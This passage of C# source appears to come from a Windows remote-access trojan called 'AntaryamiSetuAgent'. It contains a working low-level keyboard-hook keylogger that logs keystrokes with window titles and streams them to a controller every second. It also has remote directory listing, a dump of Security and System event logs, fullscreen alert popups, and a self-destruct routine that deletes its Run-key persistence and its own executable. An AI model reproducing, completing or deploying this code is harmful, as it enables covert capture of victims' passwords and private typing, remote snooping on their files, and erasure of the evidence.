                        };
                        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 30));
                        layout.RowStyles.Add(new RowStyle(SizeType.AutoSize));
                        layout.RowStyles.Add(new RowStyle(SizeType.AutoSize));
                        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 30));

                        // Warning icon label
                        Label lblIcon = new Label
                        {
                            Text = "\u26a0",
                            Font = new Font("Segoe UI", 64F, FontStyle.Bold),
                            ForeColor = Color.FromArgb(255, 200, 0),
                            TextAlign = ContentAlignment.MiddleCenter,
                            Dock = DockStyle.Fill,
                            AutoSize = false
                        };

                        // Message label
                        Label lblMessage = new Label
                        {
                            Text = message,
                            Font = new Font("Segoe UI", 22F, FontStyle.Regular),
                            ForeColor = Color.White,
                            TextAlign = ContentAlignment.MiddleCenter,
                            Dock = DockStyle.Fill,
                            MaximumSize = new Size(900, 0),
                            AutoSize = true,
                            Padding = new Padding(40, 20, 40, 20)
                        };

                        // Dismiss button
                        Button btnDismiss = new Button
                        {
                            Text = "\u2715  DISMISS",
                            Font = new Font("Consolas", 14F, FontStyle.Bold),
                            ForeColor = Color.White,
                            BackColor = Color.FromArgb(220, 30, 30),
                            FlatStyle = FlatStyle.Flat,
                            Width = 220,
                            Height = 50,
                            Cursor = Cursors.Hand,
                            Anchor = AnchorStyles.None
                        };
                        btnDismiss.FlatAppearance.BorderSize = 0;
                        btnDismiss.Click += (s, e) => CloseAllForms();

                        // Center the button in a panel
                        Panel btnPanel = new Panel
                        {
                            Height = 70,
                            Dock = DockStyle.Fill,
                            BackColor = Color.Transparent
                        };
                        btnDismiss.Location = new Point(0, 10);
                        btnPanel.Controls.Add(btnDismiss);
                        btnPanel.Resize += (s, e) =>
                        {
                            btnDismiss.Location = new Point((btnPanel.Width - btnDismiss.Width) / 2, 10);
                        };

                        layout.Controls.Add(lblIcon, 0, 1);
                        layout.Controls.Add(lblMessage, 0, 2);
                        layout.Controls.Add(btnPanel, 0, 3);

                        alertForm.Controls.Add(layout);

                        // Allow ESC to close
                        alertForm.KeyPreview = true;
                        alertForm.KeyDown += (s, e) =>
                        {
                            if (e.KeyCode == Keys.Escape || e.KeyCode == Keys.Enter)
                                CloseAllForms();
                        };

                        forms.Add(alertForm);
                    }

                    // Run the message loop using our custom MultiFormApplicationContext
                    if (forms.Count > 0)
                    {
                        Application.Run(new MultiFormApplicationContext(forms));
                    }
                    
                    blinkTimer.Stop();
                    blinkTimer.Dispose();
                });
                alertThread.SetApartmentState(ApartmentState.STA);
                alertThread.IsBackground = true;
                alertThread.Start();
            }
            catch { }
        }

        private static void SelfDestruct()
        {
            try
            {
                string appName = "AntaryamiSetuAgent";
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(appName, false);
                    }
                }
            }
            catch { }

            try
            {
                string? appPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (!string.IsNullOrEmpty(appPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c choice /t 3 /d y > nul & del \"{appPath}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
            }
            catch { }

            Environment.Exit(0);
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                const int maxChars = 256;
                StringBuilder buffer = new StringBuilder(maxChars);
                IntPtr handle = GetForegroundWindow();

                if (handle != IntPtr.Zero && GetWindowText(handle, buffer, maxChars) > 0)
                {
                    return buffer.ToString();
                }
                return "System Idle";
            }
            catch { return "Unknown Process Context"; }
        }

        private static string GetHardwareBoundIdentifier()
        {
            try
            {
                string rawId = Environment.MachineName + Environment.UserName;
                using (var sha256 = System.Security.Cryptography.SHA256.Create())
                {
                    byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(rawId));
                    return BitConverter.ToString(bytes).Replace("-", "").ToLower().Substring(0, 12) + "_SETU";
                }
            }
            catch
            {
                return "82a8ec330e9c_SETU";
            }
        }

        // =========================================================
        // KEYLOGGER ENGINE METHODS
        // =========================================================
        private static void StartKeylogger()
        {
            Thread keyloggerThread = new Thread(() =>
            {
                _kbHookProc = HookCallback;
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule!)
                {
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _kbHookProc, GetModuleHandle(curModule.ModuleName!), 0);
                }

                // Run message loop
                MSG msg;
                while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                if (_hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookId);
                }
            });
            keyloggerThread.SetApartmentState(ApartmentState.STA);
            keyloggerThread.IsBackground = true;
            keyloggerThread.Start();
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                lock (_keyLock)
                {
                    if (!_isKeylogging)
                    {
                        return CallNextHookEx(_hookId, nCode, wParam, lParam);
                    }
                }

                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = GetKeyString(vkCode);

                if (!string.IsNullOrEmpty(keyName))
                {
                    lock (_keyLock)
                    {
                        string currentWindow = GetActiveWindowTitle();
                        if (currentWindow != _lastWindow)
                        {
                            _lastWindow = currentWindow;
                            _keyBuffer.Append($"\n\n[{DateTime.Now:HH:mm:ss} - Window: {currentWindow}]\n");
                        }
                        _keyBuffer.Append(keyName);
                    }
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string GetKeyString(int vkCode)
        {
            switch (vkCode)
            {
                case 0x08: return "[Back]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\n";
                case 0x14: return "[CapsLock]";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x25: return "[Left]";
                case 0x26: return "[Up]";
                case 0x27: return "[Right]";
                case 0x28: return "[Down]";
                case 0x2E: return "[Delete]";
                case 0xA0:
                case 0xA1: return "[Shift]";
                case 0xA2:
                case 0xA3: return "[Ctrl]";
                case 0xA4:
                case 0xA5: return "[Alt]";
                default:
                    if (vkCode >= 32 && vkCode <= 126)
                    {
                        short shiftState = GetAsyncKeyState(0x10); // VK_SHIFT
                        short capsState = GetKeyState(0x14); // VK_CAPITAL
                        bool isShiftPressed = (shiftState & 0x8000) != 0;
                        bool isCapsLock = (capsState & 0x0001) != 0;
                        bool isUpper = isShiftPressed ^ isCapsLock;
                        
                        char ch = (char)vkCode;
                        if (ch >= 'A' && ch <= 'Z')
                        {
                            return isUpper ? ch.ToString() : ch.ToString().ToLower();
                        }
                        
                        if (isShiftPressed)
                        {
                            switch (ch)
                            {
                                case '1': return "!";
                                case '2': return "@";
                                case '3': return "#";
                                case '4': return "$";
                                case '5': return "%";
                                case '6': return "^";
                                case '7': return "&";
                                case '8': return "*";
                                case '9': return "(";
                                case '0': return ")";
                                case '-': return "_";
                                case '=': return "+";
                                case '[': return "{";
                                case ']': return "}";
                                case ';': return ":";
                                case '\'': return "\"";
                                case ',': return "<";
                                case '.': return ">";
                                case '/': return "?";
                                case '\\': return "|";
                                case '`': return "~";
                            }
                        }
                        return ch.ToString();
                    }
                    return $"[Key_{vkCode}]";
            }
        }

        private static async Task KeyloggerStreamLoopAsync(CancellationToken token)
        {
            while (_isConnected && !token.IsCancellationRequested)
            {
                try
                {
                    string dataToSend = string.Empty;
                    lock (_keyLock)
                    {
                        if (_keyBuffer.Length > 0)
                        {
                            dataToSend = _keyBuffer.ToString();
                            _keyBuffer.Clear();
                        }
                    }

                    if (!string.IsNullOrEmpty(dataToSend))
                    {
                        byte[] payload = Encoding.UTF8.GetBytes(dataToSend);
                        SendPacket(7, payload); // Type 7 = Keystrokes
                    }
                }
                catch { }

                await Task.Delay(1000, token); // Send every 1s
            }
        }

        private static void HandleFileManagerList(string path)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(path) || path == "Unknown")
                {
                    path = Directory.GetCurrentDirectory();
                }

                if (!Directory.Exists(path))
                {
                    SendOutput($"[-] Directory not found: {path}");
                    return;
                }

                var folders = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                var items = new List<Dictionary<string, object>>();

                foreach (var folder in folders)
                {
                    var fInfo = new DirectoryInfo(folder);
                    items.Add(new Dictionary<string, object>
                    {
                        { "name", fInfo.Name },
                        { "is_dir", true },
                        { "size", 0L }
                    });
                }

                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    items.Add(new Dictionary<string, object>
                    {
                        { "name", fileInfo.Name },
                        { "is_dir", false },
                        { "size", fileInfo.Length }
                    });
                }

                var response = new Dictionary<string, object>
                {
                    { "current_path", path },
                    { "items", items }
                };

                string json = JsonSerializer.Serialize(response);
                SendPacket(9, Encoding.UTF8.GetBytes(json));
            }
            catch (Exception ex)
            {
                SendOutput($"[-] Directory listing error: {ex.Message}");
            }
        }

        private static void DumpEventLogs()
        {
            try
            {
                SendOutput("[*] Initiating Windows Event Log Forensics...");

                StringBuilder sb = new StringBuilder();
                sb.AppendLine("==================================================");
                sb.AppendLine("       🌌 WINDOWS EVENT LOG FORENSIC REPORT        ");
                sb.AppendLine("==================================================");
                sb.AppendLine("[*] Audited Target IDs: 4624 (Logon), 4625 (Failed Logon), 1102 (Clear), 7045 (New Service)");
                sb.AppendLine($"[*] Extraction Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");

                int logonSuccessCount = 0;
                int logonFailedCount = 0;
                int logsClearedCount = 0;
                int serviceInstalledCount = 0;

                // --- 1. Security Logs: logon success, failed, cleared ---
                sb.AppendLine("[📊 SECURITY AUDIT EVENTS - LOGONS & CLEARS]");
                sb.AppendLine("--------------------------------------------------");
                try
                {
                    var securityQuery = new EventLogQuery("Security", PathType.LogName, "*[System[(EventID=4624 or EventID=4625 or EventID=1102)]]");
                    using var reader = new EventLogReader(securityQuery);
                    EventRecord record;
                    List<EventRecord> records = new List<EventRecord>();
                    while ((record = reader.ReadEvent()) != null)
                    {
                        records.Add(record);
                        if (records.Count >= 200) break; // Limit records read to keep performance high
                    }
                    records.Reverse(); // Most recent first

                    int displayed = 0;
                    foreach (var rec in records)
                    {
                        if (rec.Id == 4624) logonSuccessCount++;
                        else if (rec.Id == 4625) logonFailedCount++;
                        else if (rec.Id == 1102) logsClearedCount++;

                        if (displayed < 25) // Display first 25 security logs in report to avoid huge output
                        {
                            string typeStr = rec.Id == 4624 ? "SUCCESS_LOGON" : (rec.Id == 4625 ? "FAILED_LOGON" : "AUDIT_LOG_CLEARED");
                            string timeStr = rec.TimeCreated?.ToString("yyyy-MM-dd HH:mm:ss") ?? "N/A";
                            sb.AppendLine($"[{timeStr}] Event ID: {rec.Id} | Type: {typeStr}");

                            try
                            {
                                if (rec.Properties != null && rec.Properties.Count > 6)
                                {
                                    string targetUser = rec.Properties[5].Value?.ToString() ?? "N/A";
                                    string targetDomain = rec.Properties[6].Value?.ToString() ?? "N/A";
                                    string logonType = rec.Properties.Count > 8 ? rec.Properties[8].Value?.ToString() : "N/A";
                                    
                                    // Parse logon type name if numerical
                                    if (int.TryParse(logonType, out int typeNum))
                                    {
                                        string typeName = typeNum switch
                                        {
                                            2 => "Interactive (Keyboard)",
                                            3 => "Network (SMB/Share)",
                                            4 => "Batch",
                                            5 => "Service",
                                            7 => "Unlock",
                                            8 => "NetworkCleartext",
                                            9 => "NewCredentials",
                                            10 => "RemoteInteractive (RDP)",
                                            11 => "CachedInteractive",
                                            _ => $"Type {typeNum}"
                                        };
                                        logonType = $"{typeNum} ({typeName})";
                                    }
                                    sb.AppendLine($"   User: {targetDomain}\\{targetUser} | LogonType: {logonType}");
                                }
                            }
                            catch { }
                            displayed++;
                        }
                    }
                    if (records.Count == 0)
                    {
                        sb.AppendLine("No recent Security logon events found.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"[-] Security Log access failed (Admin privilege required?): {ex.Message}");
                }

                // --- 2. System Logs: service installations ---
                sb.AppendLine("\n[🔌 SYSTEM SERVICE EVENTS - PERSISTENCE AUDITING]");
                sb.AppendLine("--------------------------------------------------");
                try
                {
                    var systemQuery = new EventLogQuery("System", PathType.LogName, "*[System[(EventID=7045)]]");
                    using var reader = new EventLogReader(systemQuery);
                    EventRecord record;
                    List<EventRecord> records = new List<EventRecord>();
                    while ((record = reader.ReadEvent()) != null)
                    {
                        records.Add(record);
                        if (records.Count >= 100) break;
                    }
                    records.Reverse();

                    int displayed = 0;
                    foreach (var rec in records)
                    {
                        serviceInstalledCount++;
                        if (displayed < 15) // Display first 15 installed services
                        {
                            string timeStr = rec.TimeCreated?.ToString("yyyy-MM-dd HH:mm:ss") ?? "N/A";
                            sb.AppendLine($"[{timeStr}] Event ID: {rec.Id} (New Service Installed)");
                            try
                            {
                                if (rec.Properties != null && rec.Properties.Count > 1)
                                {
                                    string serviceName = rec.Properties[0].Value?.ToString() ?? "N/A";
                                    string imagePath = rec.Properties[1].Value?.ToString() ?? "N/A";
                                    string serviceType = rec.Properties.Count > 2 ? rec.Properties[2].Value?.ToString() : "N/A";
                                    sb.AppendLine($"   Service: {serviceName} | Path: {imagePath}");
                                }
                            }
                            catch { }
                            displayed++;
                        }
                    }
                    if (records.Count == 0)
                    {
                        sb.AppendLine("No recent Service installation events found.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"[-] System Log access failed: {ex.Message}");
                }

                // --- 3. Forensic Summary ---
                sb.AppendLine("\n==================================================");
                sb.AppendLine("       🔍 DIGITAL FORENSICS METRICS SUMMARY        ");
                sb.AppendLine("==================================================");
                sb.AppendLine($" [+] Total Successful Logons (ID 4624): {logonSuccessCount}");
                sb.AppendLine($" [+] Total Failed Logons (ID 4625):     {logonFailedCount}");
                sb.AppendLine($" [+] Total Log Clear Attempts (ID 1102): {logsClearedCount}");
                sb.AppendLine($" [+] Total New Services (ID 7045):        {serviceInstalledCount}");
                sb.AppendLine("==================================================");

                SendOutput(sb.ToString());
            }
            catch (Exception ex)
            {
                SendOutput($"[-] Event Log Forensic failure: {ex.Message}");
            }
        }
    }

    public class MultiFormApplicationContext : ApplicationContext
    {
        private int _openForms;
        public MultiFormApplicationContext(List<Form> forms)
        {
            _openForms = forms.Count;
            foreach (var form in forms)
            {
                form.FormClosed += (s, e) =>
                {
                    if (Interlocked.Decrement(ref _openForms) == 0)
                    {
                        ExitThread();
                    }
                };
                form.Show();
            }
        }
    }
}
